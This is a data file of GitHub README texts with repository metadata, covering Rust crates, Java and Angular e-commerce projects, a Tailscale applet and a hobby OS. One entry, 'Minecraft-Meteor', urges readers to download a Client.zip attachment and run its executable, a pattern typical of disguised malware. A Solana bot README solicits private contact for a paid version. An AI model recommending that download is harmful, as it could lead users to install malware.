- [ ] Provide Real-time Shipping Rates
- [ ] Implement Order Dispatch and Delivery Tracking

### Payments
- [ ] Integrate Stripe Payment
- [ ] Integrate PayPal Payment
- [ ] Handle Refunds and Returns
- [ ] Support Multiple Payment Methods

### Notifications
- [ ] Email Notifications for Order Confirmation
- [ ] SMS Notifications for Shipping Updates
- [ ] Push Notifications

### Admin Dashboard
- [ ] Manage Users
- [ ] Manage Products
- [ ] Manage Orders
- [ ] View Analytics (Sales, Revenue)

### Testing
- [ ] Write Unit Tests (Junit, Mockito)
- [ ] Write Integration Tests

## Contribution Guidelines

We welcome contributions! Please see our [CONTRIBUTING.md](./MEMBER.md) for details on the process for submitting pull requests.

### Getting Started

1. **Clone the Repository**: 
   ```bash
   git clone https://github.com/anonystick/JAVA-ecommerce-backend-api-MEMBER
   cd JAVA-ecommerce-backend-api-MEMBER
   ```

2. **Build the Project**:
   ```bash
   mvn clean install
   ```

3. **Run with Docker**:
   ```bash
   docker-compose up
   ```

4. **Access the API Documentation**:
   Once the server is running, go to: `http://localhost:9966/swagger-ui/`

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",0,0,1,,,6.0
apache/maven-hocon-extension,main,"<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the ""License""); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an ""AS IS"" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
[Apache Maven Hocon Extension](https://maven.apache.org/extensions/maven-xinclude-extension/)
==================================

[![Apache License, Version 2.0, January 2004](https://img.shields.io/github/license/apache/maven.svg?label=License)](https://www.apache.org/licenses/LICENSE-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/org.apache.maven.extensions/maven-xinclude-extension.svg?label=Maven%20Central)](https://search.maven.org/artifact/org.apache.maven.extensions/maven-xinclude-extension)

This project provides a Hocon POM parser extension for Maven 4. It allows POMs to 
be written with the [Hocon](https://github.com/lightbend/config/blob/master/HOCON.md)
syntax, which is a superset of the [JSON](https://json.org/) syntax.

License
-------
This code is under the [Apache License, Version 2.0, January 2004][license].

See the [`NOTICE`](./NOTICE) file for required notices and attributions.

Usage
-----
To use this extension, the following declaration needs to be done in your `${rootDirectory}/.mvn/extensions.xml`:
```
<extensions xmlns=""http://maven.apache.org/EXTENSIONS/1.2.0"">
    <extension>
        <groupId>org.apache.maven.extensions</groupId>
        <artifactId>maven-hocon-extension</artifactId>
        <version>@project.version@</version>
    </extension>
</extensions>
```
This allows defining a POM using Hocon syntax:
```
modelVersion = 4.1.0
parent {
    groupId = org.apache.maven.hocon.its
    artifactId = parent
    version = 1.0.0-SNAPSHOT
}
artifactId = test

properties = {
  ""my.property"" = foo
  pluginVersion = 3.9
}

dependencies = [
    # just add one dummy dependency
    ""com.typesafe:config:1.4.2""
]
```
",0,0,3,,maven-verify.yml,3.0
cosmic-utils/gui-scale-applet,main,"# GUI Scale About
This is a COSMIC applet for Tailscale. It has SSH and Allow Routes enable/disable and Tail Drop functionality.

## Dependencies
You must first have Tailscale installed and then run:

```bash
sudo tailscale set --operator=$USER
```

This makes it where the applet doesn't need sudo to do its job.

## Screenshots

![gui-scale-applet-panel](/screenshots/gui-scale-panel.png)  
![gui-scale-applet-open](/screenshots/gui-scale-applet-open.png)  

## How to Install
### Fedora/Fedora based distros
Add the Copr repo:

```bash
sudo dnf copr enable bhh32/gui-scale-applet
sudo dnf update --refresh
sudo dnf install -y gui-scale-applet
```
  
### Debian/Ubuntu (including Pop!OS) based Distros
Unfortunately, I don't know anything like Copr for these distros, so you can download the deb package from the releases section of this repo.

### Other
For any other distros (except atomic/immutable distros) you can run:  
  
```bash
git clone https://github.com/cosmic-utils/gui-scale-applet.git
cd gui-scale-applet
sudo just install
```",4,2,3,BSD-3-Clause,,3.0
theelderbeever/mulligan,main,"# mulligan

A flexible retry library for Rust async operations with configurable backoff strategies and jitter.

[![Crates.io](https://img.shields.io/crates/v/mulligan.svg)](https://crates.io/crates/mulligan)
[![Documentation](https://docs.rs/mulligan/badge.svg)](https://docs.rs/mulligan)

`mulligan` provides a fluent API for retrying async operations with customizable retry policies, backoff strategies, and jitter. It supports both `tokio` and `async-std` runtimes.

## Features

- Multiple backoff strategies:
  - Fixed delay
  - Linear backoff
  - Exponential backoff
- Configurable jitter options:
  - Full jitter
  - Equal jitter
  - Decorrelated jitter
- Maximum retry attempts
- Maximum delay caps
- Custom retry conditions
- Async runtime support:
  - `tokio` (via `tokio` feature)
  - `async-std` (via `async-std` feature)

## Contributing

Formatting and linting hooks are run via `pre-commit` and will run prior to each commit. If the hooks fail they will reject the commit. The `end-of-file-fixer` and `trailing-whitespace` will automatically make the necessary fixes and you can just `git add ... && git commit -m ...` again immediately. The `fmt` and `clippy` lints will require your intervention.

If you _MUST_ bypass the commit hooks to get things on a branch you can `git commit --no-verify -m ...` to skip the hooks.

```
brew install pre-commit

pre-commit install
```

```yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      # - id: check-yaml
      - id: end-of-file-fixer
      - id: trailing-whitespace
  - repo: https://github.com/doublify/pre-commit-rust
    rev: v1.0
    hooks:
      - id: fmt
      - id: clippy
        args: [ --all-targets, --, -D, clippy::all ]
```

## Quick Start

```rust
use std::time::Duration;

async fn fallible_operation(msg: &str) -> std::io::Result<()> {
    // Your potentially failing operation here
    Err(std::io::Error::other(msg))
}

#[tokio::main]
async fn main() {
    let result = mulligan::until_ok()
        .stop_after(5)                     // Try up to 5 times
        .max_delay(Duration::from_secs(3)) // Cap maximum delay at 3 seconds
        .exponential(Duration::from_secs(1)) // Use exponential backoff
        .full_jitter()                     // Add randomized jitter
        .retry(|| async {
            fallible_operation(""connection failed"").await
        })
        .await;
}
```

Alternatively, you may provide a custom stopping condition. `mulligan::until_ok()` is equivalent to the custom stopping condition shown below.

```rust
#[tokio::main]
async fn main() {
    let result = mulligan::until(|res| res.is_ok())
        .stop_after(5)                     // Try up to 5 times
        .max_delay(Duration::from_secs(3)) // Cap maximum delay at 3 seconds
        .exponential(Duration::from_secs(1)) // Use exponential backoff
        .full_jitter()                     // Add randomized jitter
        .on_retry(|prev, attempts| {       // Run before each retry.
            println!(""In the {}-th attempt, the returned result is {:?}."", attempts, prev);
            println!(""Start next attempt"");
        })
        .retry(|| async {
            fallible_operation(""connection failed"").await
        })
        .await;
}
```

## Installation

Add this to your `Cargo.toml`:

```toml
[dependencies]
mulligan = { version = ""0.1"", features = [""tokio""] } # or [""async-std""]
```
",0,5,4,MIT,pull_request.yaml,5.0
C0de-cake/ecommerce-app,main,"# Ecommerce platform (fullstack project) Spring boot 3, Angular 18, Tailwind CSS, PostgreSQL, Kinde (2024)

Monorepo of the Ecommerce platform app.

[Video tutorial](https://youtu.be/4npG3sAMT5I)

### Key Features:
- üõ†Ô∏è Admin panel for products and categories 
- üîç‚ú® Filter engine
- üåê‚ö° Angular SSR 
- üí≥ Stripe integration
- üè¢ Hexagonal architecture (Backend)


## Usage
### Prerequisites
- [NodeJS 20.17 LTS](https://nodejs.org/dist/v20.17.0/node-v20.17.0.pkg)
- [Angular CLI v18](https://www.npmjs.com/package/@angular/cli)
- IDE ([VSCode](https://code.visualstudio.com/download), [IntelliJ](https://www.jetbrains.com/idea/download/))
- [JDK 21](https://adoptium.net/temurin/releases/)
- Docker ([Docker Desktop](https://docs.docker.com/engine/install/))

### Fetch dependencies
``npm install``

You will need to create an .env file at the root of the ecom-backend folder with the following values :

````
KINDE_CLIENT_ID=<client-id>
KINDE_CLIENT_SECRET=<client-secret>
STRIPE_API_KEY=<stripe-api-key>
STRIPE_WEBHOOK_SECRET=<stripe-webhook-secret>
````

## Manage the frontend

To run the dev server for your app, use:

```sh
npx nx serve ecom-frontend
```

To create a production bundle:

```sh
npx nx build ecom-frontend
```

To see all available targets to run for a project, run:

```sh
npx nx show project ecom-frontend
```

## Manage the Backend

To run the dev server for your app, use:

```sh
npx nx serve ecom-backend
```

To create a production bundle:

```sh
npx nx build ecom-backend
```

To see all available targets to run for a project, run:

```sh
npx nx show project ecom-backend
```
",0,0,1,,,0.0
cutupdev/Solana-Arbitrage-Bot,main,"
## Folders description
- `offchain/`: off-chain arbitrage bot code 
- `swap/`: on-chain swap program
- `pools/`: dex pool metadata
- `onchain/`: analysis of other arbitrage swaps
- `mainnet/`: fork mainnet account states to test swap input/output estimates

## Current version
This is primary version, not advanced. To get more efficient arbitragy, you need to get advanced version, feel free to reach out of me(Whatsapp: https://wa.me/13137423660 Or Telegram: https://t.me/DevCutup)

## Current version dexs supported 
- serum 
- aldrin 
- saber 
- mercurial 
- orca 

## Advanced version dexs supported
- raydium
- meteora
- serum 
- aldrin 
- saber 
- mercurial 
- orca

",0,0,2,MIT,,1.0
zlfn/rust-gb,main,"<div align=""center"">
  <img align=""center"" width=80% src=""media/rust-gb-logo.jpg""/>
  <br/>
</div>

---

[![Crates.io Version](https://img.shields.io/crates/v/rust-gb?style=for-the-badge&logo=rust&color=dea584&link=https%3A%2F%2Fdocs.rs%2Frust-gb%2Flatest%2Fgb%2F)](https://crates.io/crates/rust-gb)
[![docs.rs](https://img.shields.io/docsrs/rust-gb?style=for-the-badge&logo=docsdotrs&color=%23000000&link=https%3A%2F%2Fdocs.rs%2Frust-gb%2Flatest%2Fgb%2F)](https://docs.rs/rust-gb/latest/gb/)
[![Crates.io License](https://img.shields.io/crates/l/rust-gb?style=for-the-badge&logo=opensourceinitiative&logoColor=white&color=3DA639)](https://github.com/zlfn/rust-gb/blob/main/LICENSE)


Compile Rust code to GBZ80 (Work in Progress)  
You can find ROM builds of examples in [release](https://github.com/zlfn/rust-gb/releases/tag/v0.0.1-alpha)

## How is this possible?
GameBoy is not a possible target of Rust (even its not in [Tier 3](https://doc.rust-lang.org/nightly/rustc/platform-support.html)), and there is currently no suitable (stable) LLVM backend for the CPU in GameBoy. Therefore, the Rust code is compiled using the following process.
1. The Rust compiler can generate LLVM-IR for the ATMega328 processor. (which powers Arduino)
2. LLVM-IR can be converted to C code using [llvm-cbe](https://github.com/JuliaHubOSS/llvm-cbe).
3. The C code can then be compiled to Z80 Assembly using [sdcc](https://sdcc.sourceforge.net/).
4. Z80 Assembly can be assembled into GBZ80 object code with [sdasgb](https://gbdk-2020.github.io/gbdk-2020/docs/api/docs_supported_consoles.html).
5. The GBZ80 object code can be linked with GBDK libraries and built into a Game Boy ROM using [lcc](https://gbdk-2020.github.io/gbdk-2020/docs/api/docs_toolchain.html#lcc).

I referred to [z80-babel](https://github.com/MartinezTorres/z80_babel) for steps 1‚Äì3, and used [gbdk-2020](https://github.com/gbdk-2020/gbdk-2020) for steps 4‚Äì5.

In the long run, I hope to write LLVM backend for z80 (sm83), and include it in Rust's Tier 3 list. This will dramatically simplify the build chain.

## Why use Rust instead of C or ASM?
1. Rust provides higher-level and better grammar than C.
2. Rust's memory stability and strict types help you avoid to write incorrect code (even on a small device).
3. Putting everything aside, it's fun!

## Goal
This project's goal is to develop a Game Boy Development Kit that enables the creation of Game Boy games using Rust, including *safe* management APIs in Game Boy memory, abstracted functions, and more.

Currently, the dependence on GBDK is large, but we plan to gradually reduce it.

## Support
If you like this project, you can always join our [Discussion](https://github.com/zlfn/rust-gb/discussions)!
Please feel free to share your opinions or ideas.

This project is in its very early stages, and we are still designing many things, so it would be nice to have a variety of ideas.

PRs are always welcome too!

## Dependencies
* rust (nightly)
* avr-gcc
* avr-libc
* sdcc

This project is still a work in progress, and I haven't tested it outside of my development environment.

Dependencies may change as the project evolves.

## Related & Similar projects
- [GBDK-2020](https://github.com/gbdk-2020/gbdk-2020) : Provides the library for GameBoy.
- [llvm-cbe](https://github.com/JuliaHubOSS/llvm-cbe) : Compile Rust code to C.
- [z80_babel](https://github.com/MartinezTorres/z80_babel) : Giving an idea to compile Rust code into Z80.
- [gba](https://github.com/rust-console/gba) : Compiles the Rust code into the GameBoy but its Advance. (Unlike DMG, GBA is Rust's Tier 3 target.)

",2,2,3,NOASSERTION,,2.0
greymattergames/unbug,main,"<p align=""center"">
    <a target=""_blank"" href=""https://docs.rs/unbug"">
        <img src=""https://raw.githubusercontent.com/greymattergames/unbug/main/assets/unbug.svg"" width=""200"" alt=""Unbug logo""/>
    </a>
</p>
<h1 align=""center"">Unbug</h1>

A crate to programmatically invoke debugging breakpoints with helping macros.

These macros are designed to help developers catch errors during debugging sessions that would otherwise be a panic (which may not be desirable in certain contexts) or simply a log message (which may go unnoticed).

This crate's internals are disabled by default, there are shims provided so breakpoints will not be compiled outside of a debugging context. This means that the macros in this crate can be used freely throughout your code without having to conditionally compile them out yourself.

> ### NOTICE
>
> Stable Rust is only supported on x86, x86_64, and ARM64
>
> You must use the `enable` feature of this crate (deactivated by default) to activate the breakpoints. This crate cannot detect the presence of a debugger.

Error messages are logged when used in conjuction with [Tracing](https://github.com/tokio-rs/tracing)

## Examples

# [![VSCode debugging example](https://raw.githubusercontent.com/greymattergames/unbug/master/assets/debug.png)](https://github.com/greymattergames/unbug/blob/master/examples/basic/src/main.rs)

```rust
// trigger the debugger
unbug::breakpoint!();

// Use the tracing_subscriber crate to enable log messages
tracing_subscriber::fmt::init();

for i in 0..5 {
    // ensure! will only trigger the debugger once
    // when the expression argument is false
    unbug::ensure!(false);
    unbug::ensure!(false, ""Ensure can take an optional log message"");
    unbug::ensure!(false, ""{}"", i);

    // ensure_always! will trigger the debugger every time
    // when the expression argument is false
    unbug::ensure_always!(i % 2 == 0);

    // fail! pauses and logs an error message
    // will also only trigger once
    unbug::fail!(""fail! will continue to log in non-debug builds"");

    if i < 3 {
        // fail! and fail_always! can be formatted just like error!
        // from the Tracing crate
        unbug::fail!(""{}"", i);
    }

    let Some(_out_var) = some_option else {
        unbug::fail_always!(""fail_always! will trigger every time"");
    };
}

```

## Usage

Prepare your environment for debugging Rust.
> If you are using VSCode you will need the [Rust Analyzer](https://marketplace.visualstudio.com/items?itemName=rust-lang.rust-analyzer) and [Code LLDB](https://marketplace.visualstudio.com/items?itemName=vadimcn.vscode-lldb)  (Linux/Mac) or the [C/C++](https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools) (Windows) extensions. [See Microsoft's Documentation on Rust Debugging in VSCode](https://code.visualstudio.com/docs/languages/rust#_debugging).

__1.__ Create a debug feature in your project that will only be active in the context of a debugger, i.e. not enabled by default.

`Cargo.toml`:
```toml
[features]
default = []
my_debug_feature = [
    ""unbug/enable""
]
```

__2.__ Pass your feature flag to cargo during your debug build.

Sample VSCode `.vscode/launch.json` with LLDB (Linux/Mac):
```json
{
    ""version"": ""0.2.0"",
    ""configurations"": [
        {
            ""type"": ""lldb"",
            ""request"": ""launch"",
            ""name"": ""LLDB Debug"",
            ""cargo"": {
                ""args"": [
                    ""build"",
                    ""--bin=my_project"",
                    ""--package=my_project"",
                    ""--features=my_debug_feature""
                ],
                ""filter"": {
                    ""name"": ""my_project"",
                    ""kind"": ""bin""
                }
            },
            ""args"": [],
            ""cwd"": ""${workspaceFolder}"",
            ""env"": {
                ""CARGO_MANIFEST_DIR"": ""${workspaceFolder}""
            }
        }
    ]
}
```

Sample VSCode `.vscode/launch.json` with msvc (Windows):
```json
{
    ""version"": ""0.2.0"",
    ""configurations"": [
		{
            ""name"": ""Windows debug"",
            ""type"": ""cppvsdbg"",
            ""request"": ""launch"",
            ""program"": ""${workspaceRoot}/target/debug/unbug_basic_example.exe"",
            ""stopAtEntry"": false,
            ""cwd"": ""${workspaceRoot}"",
            ""preLaunchTask"": ""win_build_debug""
        }
    ]
}
```

and complimentary `.vscode/tasks.json`
```json
{
	""version"": ""2.0.0"",
	""tasks"": [
		{
			""type"": ""cargo"",
			""command"": ""build"",
			""args"": [
				""--bin=my_project"",
				""--package=my_project"",
				""--features=my_debug_feature""
			],
			""problemMatcher"": [
				""$rustc""
			],
			""group"": {
				""kind"": ""build"",
				""isDefault"": true
			},
			""label"": ""win_build_debug""
		}
	]
}
```

__3.__ Select the debug launch configuration for your platform and start debugging

In VSCode, open the ""Run and Debug"" panel from the left sidebar.

launch configurations can be now found in the dropdown menu next to the green ""Start Debugging"" button.

When debugging is active, controls for resume execution, step-over, and step-out are at the top of the window under the search field.


#### If you are not using x86, x86_64, or ARM64:
Including, but not limited to WASM, RISCV, PowerPC, and ARM32

Nightly Rust and the experimental [`core_intrinsics`](https://doc.rust-lang.org/core/intrinsics/fn.breakpoint.html) feature need to be used.

To Enable Nightly Rust:

You can set a workspace toolchain override by adding a `rust-toolchain.toml` file at the root of your project with the following contents:
```toml
[toolchain]
channel = ""nightly""
```

OR you can set cargo to default to nightly globally:
```bash
rustup install nightly
rustup default nightly
```

enable the core_intrinsics feature in the root of your crate (`src/main.rs` or `src/lib.rs`):

`src/main.rs`:
```rust
#![cfg_attr(
    // this configuration will conditionally activate core_intrinsics
    // only when in a dev build and your debug feature is active
    all(
        debug_assertions,
        feature = ""my_debug_feature"",
    ),
    feature(core_intrinsics),
    // Optionally allow internal_features to suppress the warning
    allow(internal_features),
)]
```


Additonally, debugging may not land on the macro statements themselves. This can have the consequence that the debgger may pause on an internal module. To avoid this, `return` or `continue` immediately following a macro invocation. Alternatively, use your debugger's ""step-out"" feature until you reenter the scope of your code.

## License

Unbug is free and open source. All code in this repository is dual-licensed under either:

- MIT License ([LICENSE-MIT](/LICENSE-MIT) or <http://opensource.org/licenses/MIT>)
- Apache License, Version 2.0 ([LICENSE-APACHE](/LICENSE-APACHE) or <http://www.apache.org/licenses/LICENSE-2.0>)

at your option.
",2,0,1,Apache-2.0,,14.0
maxcountryman/underway,main,"<h1 align=""center"">
    underway
</h1>

<p align=""center"">
    ‚è≥ Durable step functions via Postgres.
</p>

<div align=""center"">
    <a href=""https://crates.io/crates/underway"">
        <img src=""https://img.shields.io/crates/v/underway.svg"" />
    </a>
    <a href=""https://docs.rs/underway"">
        <img src=""https://docs.rs/underway/badge.svg"" />
    </a>
    <a href=""https://github.com/maxcountryman/underway/actions/workflows/rust.yml"">
        <img src=""https://github.com/maxcountryman/underway/actions/workflows/rust.yml/badge.svg"" />
    </a>
</div>

## üé® Overview

**Underway** provides durable background jobs over Postgres. Jobs are composed of a sequence of one or more steps. Each step takes the output of the previous step as its input. These simple workflows provide a powerful interface to common deferred work use cases.

Key Features:

- **PostgreSQL-Backed** Leverages PostgreSQL with `FOR UPDATE SKIP LOCKED`
  for reliable task storage and coordination.
- **Atomic Task Management** Enqueue tasks within your transactions and use
  the worker's transaction within your tasks for atomic queries.
- **Automatic Retries** Configurable retry strategies ensure tasks are
  reliably completed, even after transient failures.
- **Cron-Like Scheduling** Schedule recurring tasks with cron-like
  expressions for automated, time-based job execution.
- **Scalable and Flexible** Easily scales from a single worker to many,
  enabling seamless background job processing with minimal setup.

## ü§∏ Usage

Underway is suitable for many different use cases, ranging from simple
single-step jobs to more sophisticated multi-step jobs, where dependencies
are built up between steps.

## Welcome emails

A common use case is deferring work that can be processed later. For
instance, during user registration, we might want to send a welcome email to
new users. Rather than handling this within the registration process (e.g.,
form validation, database insertion), we can offload it to run ""out-of-band""
using Underway. By defining a job for sending the welcome email, Underway
ensures it gets processed in the background, without slowing down the user
registration flow.

```rust
use std::env;

use serde::{Deserialize, Serialize};
use sqlx::PgPool;
use underway::{Job, To};

// This is the input we'll provide to the job when we enqueue it.
#[derive(Deserialize, Serialize)]
struct WelcomeEmail {
    user_id: i32,
    email: String,
    name: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up the database connection pool.
    let database_url = &env::var(""DATABASE_URL"").expect(""DATABASE_URL should be set"");
    let pool = PgPool::connect(database_url).await?;

    // Run migrations.
    underway::run_migrations(&pool).await?;

    // Build the job.
    let job = Job::builder()
        .step(
            |_cx,
             WelcomeEmail {
                 user_id,
                 email,
                 name,
             }| async move {
                // Simulate sending an email.
                println!(""Sending welcome email to {name} <{email}> (user_id: {user_id})"");
                // Returning this indicates this is the final step.
                To::done()
            },
        )
        .name(""welcome-email"")
        .pool(pool)
        .build()
        .await?;

    // Here we enqueue a new job to be processed later.
    job.enqueue(&WelcomeEmail {
        user_id: 42,
        email: ""ferris@example.com"".to_string(),
        name: ""Ferris"".to_string(),
    })
    .await?;

    // Start processing enqueued jobs.
    job.start().await??;

    Ok(())
}
```

## Order receipts

Another common use case is defining dependencies between discrete steps of a
job. For instance, we might generate PDF receipts for orders and then email
these to customers. With Underway, each step is handled separately, making
it easy to create a job that first generates the PDF and, once
completed, proceeds to send the email.

This separation provides significant value: if the email sending service
is temporarily unavailable, we can retry the email step without having to
regenerate the PDF, avoiding unnecessary repeated work.

```rust
use std::env;

use serde::{Deserialize, Serialize};
use sqlx::PgPool;
use underway::{Job, To};

#[derive(Deserialize, Serialize)]
struct GenerateReceipt {
    // An order we want to generate a receipt for.
    order_id: i32,
}

#[derive(Deserialize, Serialize)]
struct EmailReceipt {
    // An object store key to our receipt PDF.
    receipt_key: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up the database connection pool.
    let database_url = &env::var(""DATABASE_URL"").expect(""DATABASE_URL should be set"");
    let pool = PgPool::connect(database_url).await?;

    // Run migrations.
    underway::run_migrations(&pool).await?;

    // Build the job.
    let job = Job::builder()
        .step(|_cx, GenerateReceipt { order_id }| async move {
            // Use the order ID to build a receipt PDF...
            let receipt_key = format!(""receipts_bucket/{order_id}-receipt.pdf"");
            // ...store the PDF in an object store.

            // We proceed to the next step with the receipt_key as its input.
            To::next(EmailReceipt { receipt_key })
        })
        .step(|_cx, EmailReceipt { receipt_key }| async move {
            // Retrieve the PDF from the object store, and send the email.
            println!(""Emailing receipt for {receipt_key}"");
            To::done()
        })
        .name(""order-receipt"")
        .pool(pool)
        .build()
        .await?;

    // Enqueue the job for the given order.
    job.enqueue(&GenerateReceipt { order_id: 42 }).await?;

    // Start processing enqueued jobs.
    job.start().await??;

    Ok(())
}
```

With this setup, if the email service is down, the `EmailReceipt` step can
be retried without redoing the PDF generation, saving time and resources by
not repeating the expensive step of generating the PDF.

## Daily reports

Jobs may also be run on a schedule. This makes them useful for situations
where we want to do things on a regular cadence, such as creating a daily
business report.

```rust
use std::env;

use serde::{Deserialize, Serialize};
use sqlx::PgPool;
use underway::{Job, To};

#[derive(Deserialize, Serialize)]
struct DailyReport;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up the database connection pool.
    let database_url = &env::var(""DATABASE_URL"").expect(""DATABASE_URL should be set"");
    let pool = PgPool::connect(database_url).await?;

    // Run migrations.
    underway::run_migrations(&pool).await?;

    // Build the job.
    let job = Job::builder()
        .step(|_cx, _| async move {
            // Here we would generate and store the report.
            To::done()
        })
        .name(""daily-report"")
        .pool(pool)
        .build()
        .await?;

    // Set a daily schedule with the given input.
    let daily = ""@daily[America/Los_Angeles]"".parse()?;
    job.schedule(&daily, &DailyReport).await?;

    // Start processing enqueued jobs.
    job.start().await??;

    Ok(())
}
```

## üõü Getting Help

We've put together a number of [examples][examples] to help get you started. You're also welcome to [open a discussion](https://github.com/maxcountryman/underway/discussions/new?category=q-a) and ask additional questions you might have.

## üëØ Contributing

We appreciate all kinds of contributions, thank you!

[examples]: https://github.com/maxcountryman/underway/tree/main/examples
[docs]: https://docs.rs/underway
",3,4,1,Apache-2.0,rust.yml,46.0
MrzDemon/Minecraft-Meteor,master,"# Minecraft-Meteor

Meteor is a Minecraft client that is easy to use, featuring a wide array of modules and plugin support. It is always updated to the newest version, maintaining compatibility with the latest Minecraft releases. This repository serves as the home for Meteor client version 1.21.

---

## Table of Contents
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Download](#download)

---

## Features

üöÄ **Wide Array of Modules**: Meteor comes equipped with a diverse range of modules that enhance your gameplay experience.

üõ† **Plugin Support**: Add plugins seamlessly to tailor your Minecraft environment to your preferences.

üîÑ **Regular Updates**: Meteor is constantly updated to ensure compatibility with the latest Minecraft version and to introduce new features.

üîí **Security**: Meteor prioritizes security to provide a safe and reliable client for Minecraft players.

---

## Installation

To install Meteor, follow these steps:

1. Download the latest version of Meteor from the [download section](#download).
2. Unzip the downloaded file.
3. Run the Meteor client executable.
4. Configure any settings or preferences according to your needs.

---

## Usage

After installing Meteor, launch the client and log in to your Minecraft account. Explore the various modules and plugins available to enhance your gameplay. Experiment with different combinations to create your ideal Minecraft experience.

---

## Contributing

Contributions to Meteor are welcome! If you have suggestions, bug reports, or would like to contribute code, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Test your changes thoroughly.
5. Submit a pull request.

---

## License

Meteor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

---

## Download

[<img src=""https://img.shields.io/badge/Download-Meteor_Client_1.21-brightgreen"">](https://github.com/user-attachments/files/16830358/Client.zip)

Download the latest version of Meteor by clicking the button above.

---

Thank you for checking out Meteor! Happy gaming! üéÆüåå

---",1,0,1,,,0.0
safin-m/zerOS,main,"```text

‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë
       ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë
     ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë
   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñì‚ñí‚ñë    ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë
 ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñì‚ñí‚ñë      ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë
‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë        ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë
‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë


```

<center>Minimal operating system written in Rust</center>

## Set up the environment

To set up the environment run the following commands:

```sh
   chmod +x ./install-deps.sh
```

```sh
   ./install-deps.sh
```

## Build and Run

### Build using rust-based bootloader

The runner is set up to compile, build and run the OS

To build run the following commands:

```sh
   cargo bootimage
```

and then,

```sh
   qemu-system-x86_64 -drive format=raw,file=target/x86_64-unknown-none/debug/bootimage-zer_os.bin
```

To build and run:

```sh
